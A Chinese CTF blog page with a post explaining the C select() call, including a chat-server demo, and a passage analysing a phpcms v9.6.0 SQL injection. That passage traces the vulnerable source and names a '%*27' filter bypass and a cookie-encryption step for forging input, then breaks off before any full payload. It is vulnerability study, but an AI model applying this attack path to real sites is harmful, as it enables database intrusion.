<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '6.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="personal blog">
<meta name="keywords" content="ctf web IT">
<meta property="og:type" content="website">
<meta property="og:title" content="Image&#39;s blog">
<meta property="og:url" content="https://hexo.imagemlt.xyz/page/4/index.html">
<meta property="og:site_name" content="Image&#39;s blog">
<meta property="og:description" content="personal blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Image&#39;s blog">
<meta name="twitter:description" content="personal blog">






  <link rel="canonical" href="https://hexo.imagemlt.xyz/page/4/">



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Image's blog &mdash; Welcome to Image's Blog</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
	<a href="https://github.com/imagemlt"><img style="position: absolute; top: 0; right: 0; border: 0;z-index:1" src="https://s3.amazonaws.com/github/ribbons/forkme_right_orange_ff7600.png" alt="Fork me on GitHub"></a>
  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Image's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <h1 class="site-subtitle" itemprop="description">Welcome to Image's Blog</h1>
      
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-links">
    <a href="/links/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-link"></i> <br>Links</a>
  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/thinkings-on-select/index.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/thinkings-on-select/index.html" itemprop="url">
                  对select()的理解
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-12-15 00:56:25" itemprop="dateCreated datePublished" datetime="2017-12-15T00:56:25+08:00">2017-12-15</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/人生杂谈/技术学习/" itemprop="url" rel="index"><span itemprop="name">技术学习</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>断断续续的看<strong>Beej’s Guide to Network Programming</strong>这本小册子,最近看了select函数的用法,感觉这个函数挺有用而且听特殊,理解上有点儿难度,因此记录下来关于这个函数的一些东西.</p>
</blockquote>
<h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><pre><code>#include &lt;sys/time.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
int select(int numfds, fd_set *readfds, fd_set *writefds,
fd_set *exceptfds, struct timeval *timeout);
</code></pre><h3 id="fd-set"><a href="#fd-set" class="headerlink" title="fd_set"></a><code>fd_set</code></h3><p>这里的fd_set类型相当于一个file descriptor的集合.<br>当select()函数返回时,readfs中只含有可以读的file descriptor.writefs包含可写的descriptor,exceptfds包含出错的file descriptor .(此三个参数不必都有) fd_set有一些列的操作函数:</p>
<pre><code>FD_SET(int fd, fd_set *set); //Add fd to the set .
FD_CLR(int fd, fd_set *set); //Remove fd from the set .
FD_ISSET(int fd, fd_set *set); //Return true if fd is in the set .
FD_ZERO(fd_set *set); //Clear all entries from the set .
</code></pre><h3 id="timeval结构体"><a href="#timeval结构体" class="headerlink" title="timeval结构体"></a><code>timeval</code>结构体</h3><pre><code>struct timeval {
int tv_sec; //seconds
int tv_usec;// microseconds
};
</code></pre><p>此结构体表示select函数的超时时间.设置为NULL则永远等待. 此函数使用时,numfds应设置为最高的file descriptor的值.</p>
<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>返回set中最后剩下的的数目.0表示超时,-1表示出错.</p>
<h2 id="此函数如何使用的理解"><a href="#此函数如何使用的理解" class="headerlink" title="此函数如何使用的理解"></a>此函数如何使用的理解</h2><p>我们可以在开始的时候使用<code>FD_SET</code>将我们创建的服务端套接字描述符填入一个fd_set中,然后把这个fd_set复制一下传如select的readfds参数中然后用select监听,select有返回值后则遍历所有descriptors</p>
<ul>
<li>如果这个descriptor在这个新的readfds中(<code>FD_ISSET</code>)则说明可以read<ul>
<li>如果这个descriptor正好是我们最初的那个服务端套接字  <ul>
<li>则可以进行accept操作,然后将读到的这个socksetfd就可以传入我们的fd_set中,判断这个socketfd是否比原有的最大的socketfd大,大则替换<code>select()</code>函数的第一个参数为这个新的socketfd+1.</li>
</ul>
</li>
<li>如果这个descriptor不是最初的那个服务端套接字<ul>
<li>则说明是与某个主机的一个连接,则可以调用这个套接字的<code>recv()</code>方法接收数据,如果返回0说明这个套接字已经断开,可调用<code>FD_CLR</code>将其从最初的fd_set中清除出去.否则则进行其他的一些列操作.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="一个简单的demo"><a href="#一个简单的demo" class="headerlink" title="一个简单的demo"></a>一个简单的demo</h2><pre><code>/*
** ChatServer.cpp - a practise on select()
*/
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;

#define PORT &quot;3456&quot;
#define STDIN 0

void *get_in_addr(struct sockaddr *sa)
{
    if (sa-&gt;sa_family == AF_INET)
    {
        return &amp;(((struct sockaddr_in *)sa)-&gt;sin_addr);
    }
    else
        return &amp;(((struct sockaddr_in6 *)sa)-&gt;sin6_addr);
}

int main(void)
{
    fd_set master;
    fd_set read_fds;
    int fd_max;

    int listener;
    int newfd;
    struct sockaddr_storage remoteaddr;
    socklen_t addrlen;

    char buf[256];
    char mess[256];
    int nbytes;

    char remoteIP[INET6_ADDRSTRLEN];

    int yes = 1;
    int i, j, rv;
    struct addrinfo hints, *ai, *p;

    FD_ZERO(&amp;master);
    FD_ZERO(&amp;read_fds);

    memset(&amp;hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    if ((rv = getaddrinfo(NULL, PORT, &amp;hints, &amp;ai)) != 0)
    {
        fprintf(stderr, &quot;selectserver:%s\n&quot;, gai_strerror(rv));
        exit(1);
    }

    for (p = ai; p != NULL; p = p-&gt;ai_next)
    {
        listener = socket(p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol);
        if (listener &lt; 0)
        {
            continue;
        }
        setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &amp;yes, sizeof(int));
        if (bind(listener, p-&gt;ai_addr, p-&gt;ai_addrlen) &lt; 0)
        {
            close(listener);
            continue;
        }
        break;
    }
    if (p == NULL)
    {
        fprintf(stderr, &quot;selectserver: failed to bind\n&quot;);
        exit(2);
    }
    freeaddrinfo(ai);
    if (listen(listener, 10) == -1)
    {
        perror(&quot;listen&quot;);
        exit(3);
    }
    FD_SET(listener, &amp;master);
    FD_SET(STDIN, &amp;master);
    fd_max = listener &gt; STDIN ? listener : STDIN;

    for (;;)
    {
        read_fds = master;
        if (select(fd_max + 1, &amp;read_fds, NULL, NULL, NULL) == -1)
        {
            perror(&quot;select&quot;);
            exit(4);
        }
        for (i = 0; i &lt;= fd_max; i++)
        {
            if (FD_ISSET(i, &amp;read_fds))
            { //we got one!!
                if (i == STDIN)
                {
                    fgets(buf, sizeof buf, stdin);
                    memset(mess, 0, sizeof mess);
                    sprintf(mess, &quot;server said:%s&quot;, buf);
                    for (j = 0; j &lt;= fd_max; j++)
                    {
                        if (FD_ISSET(j, &amp;master))
                        {
                            if (j != listener &amp;&amp; j != i &amp;&amp; j != STDIN)
                            {
                                if (send(j, mess, strlen(mess), 0) == -1)
                                {
                                    perror(&quot;send&quot;);
                                }
                            }
                        }
                    }
                }
                else if (i == listener)
                {
                    addrlen = sizeof remoteaddr;
                    newfd = accept(listener, (struct sockaddr *)&amp;remoteaddr, &amp;addrlen);
                    if (newfd == -1)
                    {
                        perror(&quot;accept&quot;);
                    }
                    else
                    {
                        FD_SET(newfd, &amp;master);
                        if (newfd &gt; fd_max)
                        {
                            fd_max = newfd;
                        }
                        printf(&quot;selectserver:new connection from %s on socket %d\n&quot;,
                               inet_ntop(remoteaddr.ss_family, get_in_addr((struct sockaddr *)&amp;remoteaddr), remoteIP, INET6_ADDRSTRLEN), newfd);
                        sprintf(buf, &quot;hello!!! your socket id is %d\n&quot;, newfd);
                        if (send(newfd, buf, strlen(buf), 0) == -1)
                        {
                            perror(&quot;send&quot;);
                        }
                        sprintf(buf, &quot;socket %d joined chatroom\n&quot;, newfd);
                        for (j = 0; j &lt; fd_max; j++)
                        {
                            if (FD_ISSET(j, &amp;master))
                            {
                                if (j != i &amp;&amp; j != listener &amp;&amp; j != STDIN)
                                {
                                    if (send(j, buf, strlen(buf), 0) == -1)
                                        perror(&quot;send&quot;);
                                }
                            }
                        }
                    }
                }
                else
                {
                    if ((nbytes = recv(i, buf, sizeof buf, 0)) &lt;= 0)
                    {
                        if (nbytes == 0)
                        {
                            sprintf(buf, &quot;select server: socket %d hung up\n&quot;, i);
                            printf(&quot;%s&quot;, buf);
                            for (j = 0; j &lt;= fd_max; j++)
                            {
                                if (FD_ISSET(j, &amp;master))
                                    if (j != listener &amp;&amp; j != i &amp;&amp; j != STDIN)
                                    {
                                        if (send(j, buf, strlen(buf), 0) == -1)
                                        {
                                            perror(&quot;send&quot;);
                                        }
                                    }
                            }
                        }
                        else
                        {
                            perror(&quot;recv&quot;);
                        }
                        close(i);
                        FD_CLR(i, &amp;master);
                    }
                    else
                    {
                        if (nbytes &lt;= 2)
                            nbytes = 3;
                        memset(mess, 0, sizeof mess);
                        strncpy(mess, buf, nbytes - 2);
                        printf(&quot;recv data %s from socket %d\n&quot;, mess, i);
                        sprintf(buf, &quot;socket %d says: %s\n&quot;, i, mess);
                        for (j = 0; j &lt;= fd_max; j++)
                        {
                            if (FD_ISSET(j, &amp;master))
                            {
                                if (j != listener &amp;&amp; j != i &amp;&amp; j != STDIN)
                                {
                                    if (send(j, buf, strlen(buf), 0) == -1)
                                    {
                                        perror(&quot;send&quot;);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    return 0;
}
</code></pre><blockquote>
<p>要特别注意一次select操作后readfs中只剩下了当前可读的fd.所以每次要复制一个副本穿进去.</p>
</blockquote>
<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>还是认真学习认真思考能让人不那么丧…..庆幸自己找到了自己真正的兴趣所在.<br>不要让一些没意义的东西麻痹了自己. 要时刻提醒自己生存不易.<br>不高兴了就更更博,耐心看看技术书,让自己静一静.闲了就容易生事.<br>keep on moving!!!</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/phpcmsv9sqli/index.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/phpcmsv9sqli/index.html" itemprop="url">
                  phpcms-v9.6.0sql注入漏洞分析[挖坟]
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-12-06 21:29:14" itemprop="dateCreated datePublished" datetime="2017-12-06T21:29:14+08:00">2017-12-06</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/技术学习/" itemprop="url" rel="index"><span itemprop="name">技术学习</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>还有几天就要翘课一个礼拜去深圳和厦门被各位大佬虐菜了…由于本菜鸡的代码审计一直是弱项,所以为了能打好这场比赛,这两天便找了一些代码和漏洞分析文章来学习学习.今天玩了一下这个好几个月之前的phpcms的漏洞,在差不多搞了个大概之后写了这篇文章来记录一下这个漏洞的原理.</p>
</blockquote>
<h2 id="0x01-phpcms的路由处理方式"><a href="#0x01-phpcms的路由处理方式" class="headerlink" title="0x01 phpcms的路由处理方式"></a>0x01 phpcms的路由处理方式</h2><p>index.php中,可以看到调用了pc_base::create_app()方法.跟进这个方法最后调用了_load_class()函数,参数为application.</p>
<pre><code>private static function _load_class($classname, $path = &apos;&apos;, $initialize = 1) {
        static $classes = array();
        if (empty($path)) $path = &apos;libs&apos;.DIRECTORY_SEPARATOR.&apos;classes&apos;;

        $key = md5($path.$classname);
        if (isset($classes[$key])) {
            if (!empty($classes[$key])) {
                return $classes[$key];
            } else {
                return true;
            }
        }
        if (file_exists(PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.&apos;.class.php&apos;)) {
            include PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.&apos;.class.php&apos;;
            $name = $classname;
            if ($my_path = self::my_path(PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.&apos;.class.php&apos;)) {
                include $my_path;
                $name = &apos;MY_&apos;.$classname;
            }
            if ($initialize) {
                $classes[$key] = new $name;
            } else {
                $classes[$key] = true;
            }
            return $classes[$key];
        } else {
            return false;
        }
    }
</code></pre><p>跟进phpcms/libs/classes/application.class.php文件中</p>
<pre><code>&lt;?php
/**
 *  application.class.php PHPCMS应用程序创建类
 *
 * @copyright           (C) 2005-2010 PHPCMS
 * @license             http://www.phpcms.cn/license/
 * @lastmodify          2010-6-7
 */
class application {

    /**
     * 构造函数
     */
    public function __construct() {
        $param = pc_base::load_sys_class(&apos;param&apos;);
        define(&apos;ROUTE_M&apos;, $param-&gt;route_m());
        define(&apos;ROUTE_C&apos;, $param-&gt;route_c());
        define(&apos;ROUTE_A&apos;, $param-&gt;route_a());
        $this-&gt;init();
    }

    /**
     * 调用件事
     */
    private function init() {
        $controller = $this-&gt;load_controller();
        if (method_exists($controller, ROUTE_A)) {
            if (preg_match(&apos;/^[_]/i&apos;, ROUTE_A)) {
                exit(&apos;You are visiting the action is to protect the private action&apos;);
            } else {
                call_user_func(array($controller, ROUTE_A));
            }
        } else {
            exit(&apos;Action does not exist.&apos;);
        }
    }

    /**
     * 加载控制器
     * @param string $filename
     * @param string $m
     * @return obj
     */
    private function load_controller($filename = &apos;&apos;, $m = &apos;&apos;) {
        if (empty($filename)) $filename = ROUTE_C;
        if (empty($m)) $m = ROUTE_M;
        $filepath = PC_PATH.&apos;modules&apos;.DIRECTORY_SEPARATOR.$m.DIRECTORY_SEPARATOR.$filename.&apos;.php&apos;;
        if (file_exists($filepath)) {
            $classname = $filename;
            include $filepath;
            if ($mypath = pc_base::my_path($filepath)) {
                $classname = &apos;MY_&apos;.$filename;
                include $mypath;
            }
            if(class_exists($classname)){
                return new $classname;
            }else{
                exit(&apos;Controller does not exist.&apos;);
            }
        } else {
            exit(&apos;Controller does not exist.&apos;);
        }
    }
}
</code></pre><p>可以看到构造函数中将param的<strong>route_m</strong>,<strong>route_c</strong>,<strong>route_a</strong>作为为模块名,控制器,控制器的相关函数,然后调用init函数加载这个模块的相应控制器的相应函数.跟进/phpcms/libs/classes/param.class.php文件可以得知这三个成员变量分别来自<code>$_GET[&#39;m&#39;]</code>,<code>$_GET[&#39;c&#39;]</code>,<code>$_GET[&#39;a&#39;]</code>中. 由此可确定phpcms的路由规则:<code>index.php?m=module名称&amp;c=controller名称&amp;a=函数</code></p>
<h2 id="0x02-注入漏洞分析"><a href="#0x02-注入漏洞分析" class="headerlink" title="0x02 注入漏洞分析"></a>0x02 注入漏洞分析</h2><h3 id="phpcms中负责过滤的一个函数safe-replace"><a href="#phpcms中负责过滤的一个函数safe-replace" class="headerlink" title="phpcms中负责过滤的一个函数safe_replace"></a>phpcms中负责过滤的一个函数<strong>safe_replace</strong></h3><p>源码如下:</p>
<pre><code>function safe_replace($string) {
    $string = str_replace(&apos;%20&apos;,&apos;&apos;,$string);
    $string = str_replace(&apos;%27&apos;,&apos;&apos;,$string);
    $string = str_replace(&apos;%2527&apos;,&apos;&apos;,$string);
    $string = str_replace(&apos;*&apos;,&apos;&apos;,$string);
    $string = str_replace(&apos;&quot;&apos;,&apos;&quot;&apos;,$string);
    $string = str_replace(&quot;&apos;&quot;,&apos;&apos;,$string);
    $string = str_replace(&apos;&quot;&apos;,&apos;&apos;,$string);
    $string = str_replace(&apos;;&apos;,&apos;&apos;,$string);
    $string = str_replace(&apos;&lt;&apos;,&apos;&lt;&apos;,$string);
    $string = str_replace(&apos;&gt;&apos;,&apos;&gt;&apos;,$string);
    $string = str_replace(&quot;{&quot;,&apos;&apos;,$string);
    $string = str_replace(&apos;}&apos;,&apos;&apos;,$string);
    $string = str_replace(&apos;\\&apos;,&apos;&apos;,$string);
    return $string;
}
</code></pre><p>可以看到这个函数是可以绕过的,只要传参%*27即可绕过过滤.</p>
<h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>这个漏洞的注入点位于phpcms/modules/content/down.php文件中,代码如下:</p>
<pre><code>public function init() {
        $a_k = trim($_GET[&apos;a_k&apos;]);
        if(!isset($a_k)) showmessage(L(&apos;illegal_parameters&apos;));
        $a_k = sys_auth($a_k, &apos;DECODE&apos;, pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;));
        if(empty($a_k)) showmessage(L(&apos;illegal_parameters&apos;));
        unset($i,$m,$f);
        parse_str($a_k);
        if(isset($i)) $i = $id = intval($i);
        if(!isset($m)) showmessage(L(&apos;illegal_parameters&apos;));
        if(!isset($modelid)||!isset($catid)) showmessage(L(&apos;illegal_parameters&apos;));
        if(empty($f)) showmessage(L(&apos;url_invalid&apos;));
        $allow_visitor = 1;
        $MODEL = getcache(&apos;model&apos;,&apos;commons&apos;);
        $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid][&apos;tablename&apos;];
        $this-&gt;db-&gt;table_name = $tablename.&apos;_data&apos;;
        $rs = $this-&gt;db-&gt;get_one(array(&apos;id&apos;=&gt;$id)); 
        $siteids = getcache(&apos;category_content&apos;,&apos;commons&apos;);
        $siteid = $siteids[$catid];
        $CATEGORYS = getcache(&apos;category_content_&apos;.$siteid,&apos;commons&apos;);
</code></pre><p>可以看到$a_k变量可控,对$a_k变量做一系列处理之后使用parse_str函数进行处理,这也是这个漏洞产生的一个重要原因.之后的几个变量都可以覆盖过去,可以看到$id变量被直接传递到了get_one函数中.跟进phpcms处理model相关的文件中<code>/phpcms/libs/classes/db_access.class.php</code>:</p>
<pre><code>/**
 * 获取单条记录查询
 * @param $where        查询条件
 * @param $data         需要查询的字段值[例`name`,`gender`,`birthday`]
 * @param $order        排序方式    [默认按数据库默认方式排序]
 * @param $group        分组方式    [默认为空]
 * @return array/null   数据查询结果集,如果不存在，则返回空
 */
final public function get_one($where = &apos;&apos;, $data = &apos;*&apos;, $order = &apos;&apos;, $group = &apos;&apos;) {
    if (is_array($where)) $where = $this-&gt;sqls($where);
    return $this-&gt;db-&gt;get_one($data, $this-&gt;table_name, $where, $order, $group);
}
    /**
 * 将数组转换为SQL语句
 * @param array $where 要生成的数组
 * @param string $font 连接串。
 */
final public function sqls($where, $font = &apos; AND &apos;) {
    if (is_array($where)) {
        $sql = &apos;&apos;;
        foreach ($where as $key=&gt;$val) {
            $sql .= $sql ? &quot; $font `$key` = &apos;$val&apos; &quot; : &quot; `$key` = &apos;$val&apos;&quot;;
        }
        return $sql;
    } else {
        return $where;
    }
}
</code></pre><p>调用get_one函数,跟进文件<code>/phpcms/libs/classes/db_mysqli.class.php</code>中</p>
<pre><code>/**
 * 获取单条记录查询
 * @param $data         需要查询的字段值[例`name`,`gender`,`birthday`]
 * @param $table        数据表
 * @param $where        查询条件
 * @param $order        排序方式    [默认按数据库默认方式排序]
 * @param $group        分组方式    [默认为空]
 * @return array/null   数据查询结果集,如果不存在，则返回空
 */
public function get_one($data, $table, $where = &apos;&apos;, $order = &apos;&apos;, $group = &apos;&apos;) {
    $where = $where == &apos;&apos; ? &apos;&apos; : &apos; WHERE &apos;.$where;
    $order = $order == &apos;&apos; ? &apos;&apos; : &apos; ORDER BY &apos;.$order;
    $group = $group == &apos;&apos; ? &apos;&apos; : &apos; GROUP BY &apos;.$group;
    $limit = &apos; LIMIT 1&apos;;
    $field = explode( &apos;,&apos;, $data);
    array_walk($field, array($this, &apos;add_special_char&apos;));
    $data = implode(&apos;,&apos;, $field);

    $sql = &apos;SELECT &apos;.$data.&apos; FROM `&apos;.$this-&gt;config[&apos;database&apos;].&apos;`.`&apos;.$table.&apos;`&apos;.$where.$group.$order.$limit;
    $this-&gt;execute($sql);
    $res = $this-&gt;fetch_next();
    $this-&gt;free_result();
    return $res;
}
</code></pre><p>可以看到最终$id被直接拼接到了sql语句中.因此可以进行注入.那么怎么控制$id的值? 回到down.php文件中</p>
<pre><code>public function init() {
        $a_k = trim($_GET[&apos;a_k&apos;]);
        if(!isset($a_k)) showmessage(L(&apos;illegal_parameters&apos;));
        $a_k = sys_auth($a_k, &apos;DECODE&apos;, pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;));
        if(empty($a_k)) showmessage(L(&apos;illegal_parameters&apos;));
        unset($i,$m,$f);
        parse_str($a_k);
        if(isset($i)) $i = $id = intval($i);
</code></pre><p>可以看到这个$a_k是从<code>$_GET[&#39;a_k&#39;]</code>解密得来的.只要找到一个加密的点即可控制输出.</p>
<h3 id="加密点"><a href="#加密点" class="headerlink" title="加密点"></a>加密点</h3><p>这里师傅们用的加密的点是<code>/phpcms/modules/attachment/attachments.php</code>文件中的函数<strong>swfupload_json</strong>.</p>
<pre><code>/**
 * 设置swfupload上传的json格式cookie
 */
public function swfupload_json() {
    $arr[&apos;aid&apos;] = intval($_GET[&apos;aid&apos;]);
    $arr[&apos;src&apos;] = safe_replace(trim($_GET[&apos;src&apos;]));
    $arr[&apos;filename&apos;] = urlencode(safe_replace($_GET[&apos;filename&apos;]));
    $json_str = json_encode($arr);
    $att_arr_exist = param::get_cookie(&apos;att_json&apos;);
    $att_arr_exist_tmp = explode(&apos;||&apos;, $att_arr_exist);
    if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {
        return true;
    } else {
        $json_str = $att_arr_exist ? $att_arr_exist.&apos;||&apos;.$json_str : $json_str;
        param::set_cookie(&apos;att_json&apos;,$json_str);
        return true;            
    }
}
</code></pre><p>在这个函数中,将$_GET[‘src’]使用safe_replace()函数处理后进入$arr[‘src’]中,再对$arr进行json_encode,只要不存在att_json这样一个cookie或者$json_str不在数组中就会进入else的循环中,而跟进set_cookie函数则可发现phpcms输出的cookie值正好为加密后的cookie.因此我们便可以利用这个点来加密我们的注入语句. 然而phpcms的attachments类会进行一个用户身份的判断</p>
<pre><code>function __construct() {
